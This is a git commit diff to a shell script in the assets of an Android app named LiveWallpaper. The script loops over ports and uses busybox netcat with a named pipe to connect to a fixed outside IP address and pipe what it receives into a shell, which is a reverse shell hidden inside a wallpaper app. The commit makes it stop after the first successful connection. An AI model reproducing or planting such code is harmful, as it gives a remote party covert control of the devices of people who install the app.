d3b2c3cf2267b5fceaf1b7ee9ff9751c327e7b2d
Dylan Kauling <gunsmithy@gmail.com>
2017-02-06 11:35:42 -0500

    Script only connects once
    Changed script to only connect to the listener once, not for every port.

--- LiveWallpaper/app/src/main/assets/script.sh
+++ LiveWallpaper/app/src/main/assets/script.sh
@@ -1,5 +1,11 @@
 for PORT in 10000 10001 10002 10003 10004 10005 10006 10007 10008 10009
 do
    ./busybox mkfifo backpipe
-   ./busybox nc 138.197.136.154 $PORT < backpipe | ./busybox sh &> backpipe
+   ./busybox nc 138.197.136.154 $PORT < backpipe | tee log.txt | ./busybox sh &> backpipe
+   if grep -Fxq "Connected" log.txt
+   then
+      break
+   else
+      continue
+   fi
 done
